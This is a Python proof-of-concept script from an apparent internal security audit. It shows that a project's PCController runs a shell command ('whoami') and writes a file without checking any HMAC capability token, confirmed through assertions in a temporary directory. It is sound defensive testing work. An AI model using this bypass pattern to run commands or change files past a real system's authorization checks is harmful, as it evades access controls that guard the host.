#!/usr/bin/env python3
"""
FA-09 Exploit Reproduction Script for R2: Execution Bypass (PCController)
Auditor: Explorer R2
Purpose: Empirically demonstrate that PCController executes commands and writes files
         directly to the host OS WITHOUT validating any HMAC-SHA256 CapabilityToken.
"""
import asyncio
import os
import sys
import tempfile
from pathlib import Path

# Ensure project root is on sys.path
PROJECT_ROOT = Path(__file__).resolve().parents[2]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

# Set capability secret to ensure clean environment
os.environ.setdefault("SCP_CAPABILITY_SECRET", "test-secret-32-chars-long-abcdef012345")

from scp.pc_control.pc_controller import PCController, CapabilityLevel

async def test_execution_bypass():
    with tempfile.TemporaryDirectory() as tmp_dir:
        workspace = Path(tmp_dir)
        controller = PCController(working_dir=workspace)

        print("[PROBE R2] Testing PCController.execute() without CapabilityToken...")
        # Attempt to execute an allowlisted command via PCController without providing any token
        exec_result = await controller.execute(
            command="whoami",
            capability_level=CapabilityLevel.READ_ONLY,
            approved=False,
            timeout=10,
        )
        print(f"[PROBE R2] execute result: success={exec_result.get('success')}, returnCode={exec_result.get('returnCode')}")
        print(f"[PROBE R2] stdout: {exec_result.get('stdout', '').strip()}")

        assert exec_result.get("success") is True, f"Execution failed unexpectedly: {exec_result}"
        assert exec_result.get("returnCode") == 0, f"Return code non-zero: {exec_result}"
        assert len(exec_result.get("stdout", "").strip()) > 0, "No stdout received"
        print("[PROBE R2] -> VULNERABILITY CONFIRMED: Subprocess command executed without CapabilityToken verification!")

        print("[PROBE R2] Testing PCController.write_file() without CapabilityToken...")
        target_file = workspace / "bypass_evidence.txt"
        write_result = await controller.write_file(
            path=str(target_file),
            content="VULNERABLE: Written without HMAC-SHA256 token",
            capability_level=CapabilityLevel.WORKSPACE,
            approved=True,
        )
        print(f"[PROBE R2] write_file result: success={write_result.get('success')}, backupId={write_result.get('backupId')}")
        assert write_result.get("success") is True, f"Write failed: {write_result}"
        assert target_file.exists(), "File was not written"
        assert target_file.read_text(encoding="utf-8") == "VULNERABLE: Written without HMAC-SHA256 token"
        print("[PROBE R2] -> VULNERABILITY CONFIRMED: Host filesystem mutated without CapabilityToken verification!")

        print("\n" + "=" * 70)
        print("EXPLOIT MANDATE (FA-09) RESULT: VULNERABILITY EMPIRICALLY CONFIRMED")
        print("PCController lacks PEP token boundary; executes commands and writes files with zero token checks.")
        print("=" * 70)

if __name__ == "__main__":
    asyncio.run(test_execution_bypass())
